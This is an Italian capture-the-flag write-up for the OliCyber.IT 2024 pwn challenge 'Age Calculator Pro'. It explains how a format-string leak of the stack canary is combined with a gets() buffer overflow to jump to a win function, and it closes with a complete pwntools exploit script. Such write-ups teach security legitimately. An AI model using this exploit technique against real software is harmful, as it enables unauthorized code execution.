# OliCyber.IT 2024 - Selezione territoriale

## [pwn] Age Calculator Pro (35 risoluzioni)

Non ho più voglia di ricordarmi quanti anni ho...

`nc agecalculatorpro.challs.olicyber.it 38103`

Autore: Giulia Martino <@Giulia>

## Panoramica

La challenge consiste in un binario molto semplice. Per prima cosa, il programma chiama la funzione `init`, utilizzata per le impostazioni di buffering e per stampare un grosso banner. Dopodichè, chiede all'utente di fornire un nome e lo stampa in output, chiedendo poi all'utente il suo anno di nascita. Converte l'anno di nascita in un intero e, infine, stampa l'età dell'utente. Ispezionando il binario (per esempio con Ghidra), è possibile notare una funzione `win`, che lancia una shell per noi. Il binario non è PIE ma il canary è abilitato.

```console
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Soluzione

La prima cosa da notare in questa challenge è l'utilizzo della funzione `gets` per prendere input dall'utente. Da `man gets`:

```text
DESCRIPTION
       Never use this function.
```

C'è una ragione per cui il manuale Linux ci suggerisce di non usare `gets`: questa funzione legge una stringa da standard input, ma si ferma **soltanto** quando trova un `\n` o `EOF`, indipendentemente da quanto sia il buffer dentro al quale sta leggendo. Non esiste modo di chiedere a `gets` di fermarsi dopo aver letto un certo numero di caratteri; questo può provocare buffer overflows quando l'input alla funzione `gets` è più grande del buffer utilizzato per memorizzarlo.

La funzione `gets` è utilizzata due volte per leggere da `stdin` in un buffer sullo stack. Considerata la presenza di buffer overflow, si può subito pensare a sovrascrivere l'indirizzo di ritorno nello stack con l'indirizzo della funzione `win`. Il binario non è PIE, quindi non abbiamo bisogno di un leak, e possiamo semplicemente incollare l'indirizzo di `win` nel nostro exploit.

C'è un problema da risolvere però: il binario ha la protezione canary abilitata. Se effettuiamo un overflow oltre al buffer sullo stack, con dei byte casuali fino ad arrivare all'indirizzo di ritorno, finiremo per sovrascrivere anche il canary e il nostro programma terminerà a causa di `stack smashing detected`. Abbiamo bisogno di un leak del canary, in modo da sovrascriverlo con il suo stesso valore, impedendo che la sovrascrittura venga identificata e che il programma termini.

Analizzando il binario ancora, possiamo notare l'utilizzo vulnerabile della funzione `printf`:

```c
printf(buffer);
```

Dato che `buffer` è un array controllato, abbiamo una format string vulnerability. Inserendo degli specificatori nel buffer controllato, la funzione `printf` cercherà i suoi parametri sullo stack (anche se parametri non ce ne sono), fornendoci un modo per leggere blocchi dallo stack.

Il modo più semplice è probabilmente inserire diversi specificatori `%p` fino a che non si ottiene effettivamente un canary leak. Il canary è composto da una sequenza di byte casuali lunga 8 byte + un byte nullo, ed è quindi abbastanza semplice capire quali dei leak stampati in output è davvero il canary. Ma è anche possibile utilizzare un debugger per ispezionare lo stack e controllare che l'associazione sia corretta.

![printf leaks](attachments/printf_leaks.png)

Nell'esempio sopra, il canary è il 17esimo valore: `0xf2e23800574f2c00`.  

Infine, abbiamo bisogno di sapere quanto lontano sia il canary dall'inizio del nostro input, così che possiamo allineare tutti i blocchi sullo stack correttamente. Un possibile modo consiste nell'inserire una stringa riconoscibile all'interno del buffer di input (per esempio `AAAAAAAA`), poi analizzare lo stack con un debugger e calcolare l'offset del canary. Nello screenshot sotto, un breakpoint è stato impostato appena dopo la seconda chiamata alla funzione `gets` nella funzione `main`; gli strumenti utilizzati sono `gdb` + [`pwndbg`](https://github.com/pwndbg/pwndbg).

![stack layout](attachments/stack_layout.png)

La linea rosa indica l'inizio del nostro buffer di input; la linea blu indica il canary; la linea verde indica l'indirizzo di ritorno della funzione `main`. Possiamo calcolare la distanza fra l'inizio dell'input e il canary semplicemente sottraendo i loro indirizzi:

```console
In [1]: hex(0x7fffffffdd88 - 0x7fffffffdd40)
Out[1]: '0x48'
```

E' importante notare inoltre che c'è un blocco sullo stack, fra il canary e l'indirizzo di ritorno. Possiamo quindi costruire il payload finale concatenando`0x48` bytes di padding + canary leak + `0x8` bytes di padding + indirizzo della funzione `win`.

## Exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

HOST = os.environ.get("HOST", "agecalculatorpro.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38103))

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
exe = context.binary = ELF(os.path.join(os.path.dirname(__file__), 'build/age_calculator_pro'))

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

'''.format(**locals())

io = start()

format_string = b"%p." * 20
io.sendlineafter(b"What's your name?\n", format_string)
res = io.recvuntil(b"what's your birth year?", drop=True)
canary = int(res.split(b'.')[16], 16)
print(f"[+] canary: {hex(canary)}")

payload = b"A" * 0x48
payload += p64(canary)
payload += p64(0x0)
payload += p64(exe.sym.win)
res = io.sendline(payload)
io.recvuntil(B"years old!\n")
time.sleep(0.5)
io.sendline(b"cat flag")
res = io.clean(0.5)
io.close()
print(res.decode())

```
